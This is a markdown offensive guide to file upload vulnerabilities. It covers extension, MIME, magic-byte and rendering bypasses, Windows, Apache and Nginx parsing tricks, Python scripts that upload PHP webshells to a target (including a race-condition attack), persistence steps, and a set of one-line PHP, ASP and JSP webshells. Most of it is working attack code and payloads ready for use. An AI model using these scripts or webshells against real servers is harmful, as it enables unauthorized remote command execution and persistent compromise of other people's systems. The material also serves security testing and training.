# File Upload Vulnerability - Complete Experience Guide

## Quick Detection Checklist

When encountering a file upload feature, test in this order:

1. **Direct Upload** - Try uploading `.php`, `.asp`, `.jsp` directly
2. **Frontend Bypass** - Check if validation is JS-only (no network request)
3. **Content-Type** - Change MIME type to `image/jpeg`
4. **Extension Variants** - Try `.phtml`, `.php3`, `.php5`, `.PhP`
5. **Special Characters** - Add space, dot, `::$DATA` to extension
6. **Double Write** - `.pphphp` if extension is replaced with empty
7. **.htaccess** - Upload config file to change parsing rules
8. **Image Polyglot** - Add image header to webshell
9. **Race Condition** - Continuous upload + access
10. **Path Truncation** - `%00` null byte in save path

---

## Bypass Techniques by Validation Type

### Frontend JavaScript Validation
**Detection**: Upload blocked immediately, no network request
**Bypass**:
1. Delete JS validation code in browser
2. Rename to `.jpg`, upload, intercept with Burp, change back to `.php`

### Content-Type (MIME) Validation
**Detection**: Server checks `$_FILES['file']['type']`
**Bypass**: Change `Content-Type: application/octet-stream` to `Content-Type: image/jpeg`

### Blacklist Extension
**Detection**: Specific extensions blocked
**Bypass**:
- Alternative extensions: `.phtml`, `.php3`, `.php5`, `.pht`
- Case variation: `.PHP`, `.PhP`, `.pHp`
- Special chars: `shell.php `, `shell.php.`, `shell.php::$DATA`
- Double write: `shell.pphphp`

### Whitelist Extension
**Detection**: Only specific extensions allowed
**Bypass**:
- Path control + `%00` truncation
- Array manipulation
- Image polyglot + file inclusion

### File Content/Header Check
**Detection**: Server reads file magic numbers
**Bypass**:
- Add image header: `GIF89a<?php system($_GET['c']); ?>`
- Create image polyglot: `copy pic.jpg /b + shell.php /a shell.jpg`
- Requires file inclusion to execute PHP

### Image Function Check (getimagesize, exif_imagetype)
**Detection**: Server validates image properties
**Bypass**: Upload valid image with embedded code, use file inclusion

### Secondary Rendering
**Detection**: Server re-encodes uploaded images
**Bypass**:
- Compare original vs rendered image in hex editor
- Find unchanged data regions
- Insert PHP code in those regions
- GIF works best for this

---

## Platform-Specific Tricks

### Windows
| Technique | Payload | Result |
|-----------|---------|--------|
| Trailing dot | `shell.php.` | `shell.php` |
| Trailing space | `shell.php ` | `shell.php` |
| ADS | `shell.php::$DATA` | `shell.php` |
| Double dot | `shell.php..` | `shell.php` |
| Special chars | `shell.php:.<` | `shell.php` |

### Apache
| Technique | Payload | Condition |
|-----------|---------|-----------|
| Multi-extension | `shell.php.abc` | Right-to-left parsing |
| .htaccess | Upload config file | AllowOverride enabled |
| Newline | `shell.php\x0A` | CVE-2017-15715 |

### Nginx
| Technique | Payload | Condition |
|-----------|---------|-----------|
| Null byte | `1.jpg%00php` | Version 0.8.3 |
| PHP-CGI | `1.jpg/1.php` | Nginx/IIS 7+ |

---

## Attack Scenarios

### Scenario 1: Basic Upload
```python
# Direct upload attempt
import requests

files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'application/octet-stream')}
r = requests.post('http://target/upload.php', files=files)
print(r.text)
```

### Scenario 2: Content-Type Bypass
```python
import requests

files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
r = requests.post('http://target/upload.php', files=files)
print(r.text)
```

### Scenario 3: .htaccess + Image
```python
import requests

# Step 1: Upload .htaccess
htaccess = '''AddType application/x-httpd-php .jpg'''
files = {'file': ('.htaccess', htaccess, 'text/plain')}
requests.post('http://target/upload.php', files=files)

# Step 2: Upload PHP code as .jpg
files = {'file': ('shell.jpg', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
requests.post('http://target/upload.php', files=files)

# Step 3: Access shell.jpg as PHP
```

### Scenario 4: Image Polyglot
```python
import requests

# GIF header + PHP code
payload = b'GIF89a<?php system($_GET["c"]); ?>'
files = {'file': ('shell.gif', payload, 'image/gif')}
r = requests.post('http://target/upload.php', files=files)

# Need file inclusion to execute:
# http://target/vuln.php?file=uploads/shell.gif
```

### Scenario 5: Race Condition
```python
import requests
import threading
import time

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    while True:
        requests.post('http://target/upload.php', files=files)

def access():
    while True:
        r = requests.get('http://target/uploads/shell.php?c=id')
        if 'uid=' in r.text:
            print('[+] Shell executed!')
            print(r.text)
            break

# Run multiple upload threads and access threads concurrently
```

---

## Post-Upload Steps

1. **Find Upload Location**
   - Check response for file path
   - Try common paths: `/uploads/`, `/files/`, `/images/`
   - Directory brute force if needed

2. **Verify Execution**
   - Access uploaded file directly
   - Check if code is executed or displayed as text

3. **Establish Persistence**
   - Upload webshell for remote control
   - Use one-liner for quick access:
     ```php
     <?php system($_GET['c']); ?>
     <?php echo shell_exec($_POST['cmd']); ?>
     ```

---

## Common Webshells

### PHP
```php
<?php @eval($_POST['cmd']); ?>
<?php system($_GET['c']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php assert($_POST['cmd']); ?>
```

### ASP
```asp
<%eval request("cmd")%>
<%execute request("cmd")%>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

---

## Debugging Tips

1. **Check Response Headers** - May reveal server type
2. **Error Messages** - May reveal validation logic
3. **Timing** - Race condition windows
4. **Partial Uploads** - File may exist briefly before deletion
5. **Multiple Interfaces** - Upload may be strict, but edit/rename may be loose

---

## Tools

- **Burp Suite** - Intercept and modify requests
- **Intruder** - Fuzz extensions and payloads
- **Repeater** - Manual request modification
- **HxD** - Hex editor for image analysis
- **ImageMagick/GD** - Test rendering behavior
